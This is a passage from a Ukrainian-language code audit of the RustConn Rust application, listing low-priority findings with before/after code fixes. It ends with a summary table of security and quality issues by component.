  - **Опис:** У `tool_tip()` використовується `unwrap_or_else(|e| e.into_inner())`,
    а в `menu()` poisoned lock обробляється явно з логуванням. Непослідовність.
  - **Як є зараз (Before):**
    ```rust
    // rustconn/src/tray.rs:~153
    let state = self.state.lock().unwrap_or_else(|e| e.into_inner());
    ```
  - **Як варто змінити (After):**
    ```rust
    let state = match self.state.lock() {
        Ok(state) => state,
        Err(e) => {
            tracing::warn!("Tray state mutex poisoned in tool_tip");
            e.into_inner()
        }
    };
    ```

### Низький

- [ ] **[Низький] Cairo fallback завжди використовується, навіть на Wayland**
  - **Опис:** `WaylandSurfaceHandle::initialize()` завжди встановлює
    `native_wayland_active = false`. Embedded RDP/VNC рендеринг завжди проходить
    через Cairo ImageSurface → DrawingArea, що додає один зайвий buffer copy.
    Для 4K@60fps це може бути помітним bottleneck.
  - **Як варто змінити (After):**
    ```rust
    // Архітектурне обмеження через unsafe_code = "forbid".
    // Документувати як відоме обмеження продуктивності.
    // Розглянути окремий unsafe helper crate для wl_subsurface.
    ```

- [ ] **[Низький] Signal handlers не зберігають `SignalHandlerId`**
  - **Опис:** Усі `connect_*` виклики в `EmbeddedRdpWidget` не зберігають
    повернений `SignalHandlerId`. Signal handlers не можуть бути від'єднані
    при disconnect/cleanup.
  - **Як варто змінити (After):**
    ```rust
    // Зберігати SignalHandlerId для connect_resize handler
    // і від'єднувати його при disconnect() / cleanup_embedded_mode()
    ```

- [ ] **[Низький] `From<std::io::Error>` конвертує в `ConfigError`, втрачаючи контекст**
  - **Опис:** Бланкетна конверсія `From<std::io::Error> for AppStateError` завжди
    створює `ConfigError` варіант, навіть якщо IO помилка виникла в контексті
    документа або сесії.
  - **Як є зараз (Before):**
    ```rust
    // rustconn/src/error.rs:~119-123
    impl From<std::io::Error> for AppStateError {
        fn from(err: std::io::Error) -> Self {
            Self::ConfigError(err.to_string())
        }
    }
    ```
  - **Як варто змінити (After):**
    ```rust
    // Видалити бланкетну конверсію і використовувати
    // явні .map_err() з правильним варіантом у кожному call site.
    ```

---

## 13. Компонент: CLI крейт (`rustconn-cli/`)

### Низький

- [ ] **[Низький] `CliError` не реалізує `From<RustConnError>`**
  - **Опис:** `CliError` визначає варіанти, що дублюють `RustConnError`, але не
    реалізує `From<RustConnError>`. Це змушує кожну команду вручну маппити помилки.
  - **Як варто змінити (After):**
    ```rust
    impl From<rustconn_core::error::RustConnError> for CliError {
        fn from(err: rustconn_core::error::RustConnError) -> Self {
            match err {
                RustConnError::Config(e) => Self::Config(e.to_string()),
                RustConnError::Protocol(e) => Self::Protocol(e.to_string()),
                RustConnError::Secret(e) => Self::Secret(e.to_string()),
                RustConnError::Import(e) => Self::Import(e.to_string()),
                RustConnError::Session(e) => Self::Connection(e.to_string()),
                RustConnError::Io(e) => Self::Io(e),
            }
        }
    }
    ```

---

## 14. Компонент: Тестова інфраструктура

### Низький

- [ ] **[Низький] Дублювання `#![allow(...)]` блоків між test entry points**
  - **Опис:** `property_tests.rs` та `properties/mod.rs` містять майже ідентичні
    блоки `#![allow(clippy::...)]` з розбіжностями. Блок у `mod.rs` є зайвим,
    оскільки `#![allow]` з entry point поширюються на всі підмодулі.
  - **Як варто змінити (After):**
    ```rust
    // Видалити дубльований #![allow(...)] блок з properties/mod.rs,
    // залишивши його тільки в property_tests.rs
    ```

- [ ] **[Низький] `build.rs` використовує `unwrap()` для `OUT_DIR`**
  - **Опис:** `std::env::var("OUT_DIR").unwrap()` — хоча `OUT_DIR` завжди
    встановлений Cargo, для консистентності варто використовувати `expect`.
  - **Як є зараз (Before):**
    ```rust
    // rustconn/build.rs:~11
    let out_dir = std::env::var("OUT_DIR").unwrap();
    ```
  - **Як варто змінити (After):**
    ```rust
    let out_dir = std::env::var("OUT_DIR")
        .expect("OUT_DIR must be set by Cargo");
    ```

---

## Зведена таблиця

| # | Пріоритет | Компонент | Проблема |
|---|-----------|-----------|----------|
| 3.1 | Критичний | protocol/vnc.rs | custom_args без валідації |
| 3.2 | Критичний | protocol/rdp.rs | custom_args без валідації |
| 3.3 | Критичний | protocol/serial.rs | custom_args + device без валідації |
| 3.4 | Критичний | protocol/kubernetes.rs | shell/image/custom_args без валідації |
| 3.5 | Критичний | protocol/telnet.rs | custom_args без валідації |
| 4.1 | Критичний | automation/tasks.rs | sh -c з недостатньою санітизацією |
| 3.6 | Високий | protocol/freerdp.rs | Пароль як plain String в cmdline |
| 4.2 | Високий | variables/manager.rs | Відсутня перевірка shell-метасимволів |
| 5.1 | Високий | secret/keepassxc.rs | Відсутній ліміт розміру відповіді |
| 5.2 | Високий | secret/keepassxc.rs | Пароль як plain String в пам'яті |
| 5.3 | Високий | secret/status.rs | Debug-залишки у production-коді |
| 6.1 | Високий | vnc_client/config.rs | Пароль як plain String |
| 6.2 | Високий | rdp_client/config.rs | Пароль як plain String |
| 6.3 | Високий | ffi/vnc.rs | Credentials як plain String |
| 8.1 | Високий | async_utils + state.rs | block_on на GTK main thread (~30 місць) |
| 8.2 | Високий | state.rs | rename_vault_credential блокує UI |
| 8.3 | Високий | state.rs | resolve_credentials блокує UI |
| 3.7 | Середній | protocol/spice.rs | proxy без валідації |
| 3.8 | Середній | protocol/rdp.rs | shared_folders без валідації |
| 4.3 | Середній | automation/tasks.rs | unwrap() на mutex |
| 5.4 | Середній | secret/keepassxc.rs | associated ніколи не оновлюється |
| 5.5 | Середній | secret/libsecret.rs | connection_id без валідації |
| 6.4 | Середній | vnc_client/client.rs | Відсутнє TLS |
| 6.5 | Середній | rdp_client/connection.rs | Копія пароля як String |
| 7.1 | Середній | import/traits.rs | Async read без ліміту розміру |
| 7.2 | Середній | export/ssh_config.rs | Небезпечні SSH директиви в export |
| 8.4 | Середній | embedded_rdp/mod.rs | RefCell borrow panic ризики |
| 8.5 | Середній | embedded_rdp/thread.rs | QT_QPA_PLATFORM=xcb порушує Wayland |
| 8.6 | Середній | embedded_vnc.rs | Mutex lock блокує GTK thread |
| 8.7 | Середній | embedded_rdp/mod.rs | Polling timer не зупиняється |
| 9.1 | Середній | GUI крейт (~40 місць) | eprintln! замість tracing |
| 9.2 | Середній | toast.rs | eprintln! як fallback |
| 9.3 | Середній | tracing/mod.rs | USERNAME як PII в логах |
| 10.1 | ~~Середній~~ | Cargo.toml | ✅ serde_yaml мігровано на serde_yaml_ng |
| 11.1 | Середній | document/mod.rs | Неоднозначний формат дешифрування |
| 12.1 | Середній | tray.rs | Непослідовна обробка poisoned mutex |
| 4.4 | Низький | variables/mod.rs | Секрети як plain String |
| 6.6 | Низький | vnc_client/client.rs | unwrap() у checked_sub |
| 7.3 | Низький | import/normalize.rs | Слабка валідація hostname |
| 10.2 | Низький | Cargo.toml | tracing не в workspace deps |
| 10.3 | Низький | lib.rs | Deprecated flatpak re-exports |
| 10.4 | Низький | lib.rs | Надмірний API surface |
| 12.2 | Низький | wayland_surface.rs | Cairo fallback завжди |
| 12.3 | Низький | embedded_rdp/mod.rs | Signal handlers без ID |
| 12.4 | Низький | error.rs | IO→ConfigError втрата контексту |
| 13.1 | Низький | rustconn-cli/error.rs | Відсутній From<RustConnError> |
| 14.1 | Низький | tests/ | Дублювання allow блоків |
| 14.2 | Низький | build.rs | unwrap() замість expect() |

**Всього: 51 знахідка** — 6 критичних, 12 високих, 18 середніх, 15 низьких.
